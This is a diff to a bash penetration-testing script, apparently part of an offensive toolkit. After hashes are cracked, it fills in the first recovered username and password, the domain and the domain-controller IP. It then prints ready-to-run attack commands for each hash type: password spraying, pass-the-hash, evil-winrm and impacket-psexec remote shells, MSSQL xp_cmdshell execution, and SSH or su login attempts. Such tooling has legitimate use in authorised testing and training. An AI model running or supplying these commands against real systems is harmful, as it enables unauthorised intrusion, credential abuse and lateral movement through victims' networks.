@@ -1301,7 +1301,14 @@ run_hydra() {
                 echo "  ./adr.sh -dc ${target} -u ${ex_user} -p '${ex_pass}'"
                 echo ""
                 echo -e "${GREEN}# Manual LDAP dump:${NC}"
-                echo "  ldapsearch -x -H ldap://${target} -D '${ex_user}' -w '${ex_pass}' -b 'DC=<DOMAIN>,DC=<TLD>' '(objectClass=user)'"
+                _ldap_base=""
+                _rdns=$(dig -x "${target}" +short 2>/dev/null | sed 's/\.$//' | head -1)
+                if [[ -n "${_rdns}" ]]; then
+                    _ldap_base=$(echo "${_rdns}" | awk -F'.' '{for(i=2;i<=NF;i++) printf "%sDC=%s", (i>2 ? "," : ""), $i; print ""}')
+                fi
+                _ldap_base="${_ldap_base:-${OffSec_DOMAIN:+$(echo "${OffSec_DOMAIN}" | sed 's/\./,DC=/g;s/^/DC=/')}}"
+                _ldap_base="${_ldap_base:-DC=<DOMAIN>,DC=<TLD>}"
+                echo "  ldapsearch -x -H ldap://${target} -D '${ex_user}' -w '${ex_pass}' -b '${_ldap_base}' '(objectClass=user)'"
                 ;;
             mysql)
                 echo -e "${GREEN}# MySQL access:${NC}"
@@ -1771,70 +1778,85 @@ if (( _cracked_lines > 0 )) || [[ -s "${_central_creds}" ]]; then
     local_desc="${CRACKED_HASH_TYPE:-unknown}"
     local_mode="${CRACKED_HC_MODE:-}"
 
+    # Pull first cracked user:pass from output files for resolved copy-paste examples
+    _ex_user="<USER>"
+    _ex_pass="<PASS>"
+    _first_crack=$(find "$OUTPUT_DIR" -maxdepth 1 \( -name "hashcat_cracked_*.txt" -o -name "jtr_cracked_*.txt" \) 2>/dev/null \
+        | xargs grep -h '.' 2>/dev/null | grep -v '^#' | grep ':' | head -1 || true)
+    if [[ -n "${_first_crack:-}" ]]; then
+        _ex_user="${_first_crack%%:*}"
+        _ex_pass="${_first_crack#*:}"
+    fi
+    # Domain/DC context: set once per engagement with: export OffSec_DOMAIN=corp.local OffSec_DC=10.10.10.1
+    _ex_domain="${OffSec_DOMAIN:-<DOMAIN>}"
+    _ex_dc="${OffSec_DC:-<DC_IP>}"
+
     case "${local_mode}" in
         18200)  # AS-REP
             echo ""
             echo -e "${GREEN}Hash type: AS-REP Roast (Kerberos)${NC}"
             echo "→ These are domain user credentials. Next steps:"
-            echo "  1. Spray cracked passwords against all hosts:"
-            echo "     ./sprayr.sh -U <users_file> -p '<cracked_password>' -d <DOMAIN> -t <DC_IP>"
+            echo "  1. Spray cracked password against all hosts:"
+            echo "     ./sprayr.sh -u '${_ex_user}' -p '${_ex_pass}' -d ${_ex_domain} -t ${_ex_dc}"
             echo "  2. Try direct auth on DC:"
-            echo "     nxc smb <DC_IP> -u <user> -p '<cracked_password>' -d <DOMAIN>"
+            echo "     nxc smb ${_ex_dc} -u '${_ex_user}' -p '${_ex_pass}' -d ${_ex_domain}"
             echo "  3. Run AD enumeration if creds are valid:"
-            echo "     ./adr.sh -d <DOMAIN> -u <user> -p '<cracked_password>' -dc <DC_IP>"
+            echo "     ./adr.sh -d ${_ex_domain} -u '${_ex_user}' -p '${_ex_pass}' -dc ${_ex_dc}"
             ;;
         13100|19600|19700)  # Kerberoast (RC4, AES128, AES256)
             echo ""
             echo -e "${GREEN}Hash type: Kerberoast TGS (${local_desc})${NC}"
             echo "→ These are service account credentials. Next steps:"
-            echo "  1. Spray cracked passwords:"
-            echo "     ./sprayr.sh -U <users_file> -p '<cracked_password>' -d <DOMAIN> -t <DC_IP>"
+            echo "  1. Spray cracked password:"
+            echo "     ./sprayr.sh -u '${_ex_user}' -p '${_ex_pass}' -d ${_ex_domain} -t ${_ex_dc}"
             echo "  2. Service accounts often have elevated privileges — check group membership:"
-            echo "     nxc ldap <DC_IP> -u <svc_user> -p '<cracked_password>' --groups"
+            echo "     nxc ldap ${_ex_dc} -u '${_ex_user}' -p '${_ex_pass}' --groups"
             echo "  3. Re-run AD enum with new creds:"
-            echo "     ./adr.sh -d <DOMAIN> -u <svc_user> -p '<cracked_password>' -dc <DC_IP>"
+            echo "     ./adr.sh -d ${_ex_domain} -u '${_ex_user}' -p '${_ex_pass}' -dc ${_ex_dc}"
             ;;
         1000)   # NTLM
             echo ""
             echo -e "${GREEN}Hash type: NTLM${NC}"
             echo "→ Next steps:"
             echo "  1. Spray cracked password across all hosts:"
-            echo "     ./sprayr.sh -U <users_file> -p '<cracked_password>' -d <DOMAIN> -t <DC_IP>"
-            echo "  2. OR pass-the-hash (no cracking needed):"
-            echo "     ./sprayr.sh -U <users_file> -H '<ntlm_hash>' -d <DOMAIN> -t <DC_IP>"
+            echo "     ./sprayr.sh -u '${_ex_user}' -p '${_ex_pass}' -d ${_ex_domain} -t ${_ex_dc}"
+            echo "  2. Pass-the-hash (use the raw NTLM hash — no plaintext needed):"
+            echo "     ./sprayr.sh -u '${_ex_user}' -H '${_ex_pass}' -d ${_ex_domain} -t ${_ex_dc}"
             echo "  3. Direct shell if admin:"
-            echo "     evil-winrm -i <TARGET_IP> -u <user> -p '<cracked_password>'"
-            echo "     impacket-psexec <DOMAIN>/<user>:'<cracked_password>'@<TARGET_IP>"
+            echo "     evil-winrm -i ${_ex_dc} -u '${_ex_user}' -p '${_ex_pass}'"
+            echo "     impacket-psexec ${_ex_domain}/'${_ex_user}':'${_ex_pass}'@${_ex_dc}"
             ;;
         5600)   # NTLMv2
             echo ""
             echo -e "${GREEN}Hash type: NTLMv2 (Net-NTLMv2 capture)${NC}"
             echo "→ NOTE: NTLMv2 cannot be used for pass-the-hash. Use the plaintext password."
             echo "  1. Spray cracked password:"
-            echo "     ./sprayr.sh -U <users_file> -p '<cracked_password>' -d <DOMAIN> -t <DC_IP>"
-            echo "  2. Try SMB/WinRM/RDP with cracked creds directly"
+            echo "     ./sprayr.sh -u '${_ex_user}' -p '${_ex_pass}' -d ${_ex_domain} -t ${_ex_dc}"
+            echo "  2. Direct shell attempts:"
+            echo "     evil-winrm -i ${_ex_dc} -u '${_ex_user}' -p '${_ex_pass}'"
+            echo "     nxc smb ${_ex_dc} -u '${_ex_user}' -p '${_ex_pass}' --shares"
             ;;
         1800|500|400|3200)  # Linux hashes
             echo ""
             echo -e "${GREEN}Hash type: Linux system hash (${local_desc})${NC}"
             echo "→ These are local Linux user credentials. Next steps:"
             echo "  1. Try SSH login with cracked password:"
-            echo "     ssh <username>@<TARGET_IP>"
+            echo "     ssh '${_ex_user}'@${_ex_dc}"
             echo "  2. Try su on target if you have a low-priv shell:"
-            echo "     su - <username>"
+            echo "     su - '${_ex_user}'"
             echo "  3. Check if password reused elsewhere — spray if domain-joined:"
-            echo "     ./sprayr.sh -U <users_file> -p '<cracked_password>' -t <TARGET_IP>"
+            echo "     ./sprayr.sh -u '${_ex_user}' -p '${_ex_pass}' -t ${_ex_dc}"
             ;;
         2100)  # DCC2 / MSCash2
             echo ""
             echo -e "${GREEN}Hash type: DCC2 / MSCash2 (domain cached credentials)${NC}"
             echo "→ Cached domain credential — can be used for password reuse. Next steps:"
             echo "  1. Cracked password is a domain user password — spray it:"
-            echo "     ./sprayr.sh -U <users_file> -p '<cracked_password>' -d <DOMAIN> -t <DC_IP>"
+            echo "     ./sprayr.sh -u '${_ex_user}' -p '${_ex_pass}' -d ${_ex_domain} -t ${_ex_dc}"
             echo "  2. Try direct auth to services:"
-            echo "     evil-winrm -i <TARGET_IP> -u <user> -p '<cracked_password>' -d <DOMAIN>"
+            echo "     evil-winrm -i ${_ex_dc} -u '${_ex_user}' -p '${_ex_pass}' -d ${_ex_domain}"
             echo "  3. NOTE: DCC2 hash cannot be passed-the-hash — plaintext only"
-            echo "     ./adr.sh -d <DOMAIN> -u <user> -p '<cracked_password>' -dc <DC_IP>"
+            echo "     ./adr.sh -d ${_ex_domain} -u '${_ex_user}' -p '${_ex_pass}' -dc ${_ex_dc}"
             ;;
         13400)  # KeePass
             echo ""
@@ -1846,7 +1868,7 @@ if (( _cracked_lines > 0 )) || [[ -s "${_central_creds}" ]]; then
             echo "  2. Extract all entries:"
             echo "     keepassxc-cli export <database.kdbx>  # sudo apt install keepassxc"
             echo "  3. Feed any found credentials to sprayr.sh:"
-            echo "     ./sprayr.sh -u <USER> -p '<PASSWORD_FROM_KEEPASS>' -t <TARGET_IP>"
+            echo "     ./sprayr.sh -u '${_ex_user}' -p '${_ex_pass}' -t ${_ex_dc}"
             echo "     ./sprayr.sh --from-creds  # after adding to creds.txt"
             ;;
         131|1731)  # MSSQL
@@ -1854,21 +1876,21 @@ if (( _cracked_lines > 0 )) || [[ -s "${_central_creds}" ]]; then
             echo -e "${GREEN}Hash type: MSSQL hash (${local_desc})${NC}"
             echo "→ MSSQL database credential. Next steps:"
             echo "  1. Connect to MSSQL:"
-            echo "     impacket-mssqlclient <DOMAIN>/<user>:'<cracked_password>'@<TARGET_IP>"
-            echo "     nxc mssql <TARGET_IP> -u <user> -p '<cracked_password>' -q 'SELECT @@version'"
+            echo "     impacket-mssqlclient ${_ex_domain}/'${_ex_user}':'${_ex_pass}'@${_ex_dc}"
+            echo "     nxc mssql ${_ex_dc} -u '${_ex_user}' -p '${_ex_pass}' -q 'SELECT @@version'"
             echo "  2. Check for xp_cmdshell (code execution if enabled):"
-            echo "     impacket-mssqlclient <DOMAIN>/<user>:'<pass>'@<TARGET_IP> -windows-auth"
+            echo "     impacket-mssqlclient ${_ex_domain}/'${_ex_user}':'${_ex_pass}'@${_ex_dc} -windows-auth"
             echo "     SQL> EXEC xp_cmdshell 'whoami'"
             echo "  3. Try credential reuse on other services:"
-            echo "     ./sprayr.sh -u <user> -p '<cracked_password>' -t <TARGET_IP>"
+            echo "     ./sprayr.sh -u '${_ex_user}' -p '${_ex_pass}' -t ${_ex_dc}"
             ;;
         *)
             echo ""
             echo -e "${GREEN}Hash type: ${local_desc:-unknown}${NC}"
             echo "→ Generic next steps:"
-            echo "  1. If domain creds — spray: ./sprayr.sh -U <users_file> -p '<password>' -d <DOMAIN> -t <DC_IP>"
-            echo "  2. If local Linux — try SSH: ssh <user>@<TARGET_IP>"
-            echo "  3. If web creds — try login manually or: ./crackr.sh --hydra http-post-form --target <IP>"
+            echo "  1. If domain creds — spray: ./sprayr.sh -u '${_ex_user}' -p '${_ex_pass}' -d ${_ex_domain} -t ${_ex_dc}"
+            echo "  2. If local Linux — try SSH: ssh '${_ex_user}'@${_ex_dc}"
+            echo "  3. If web creds — try login manually or: ./crackr.sh --hydra http-post-form --target ${_ex_dc}"
             echo "  4. If unknown context — check creds.txt: cat ${TOOLKIT_ROOT}/creds.txt"
             ;;
     esac
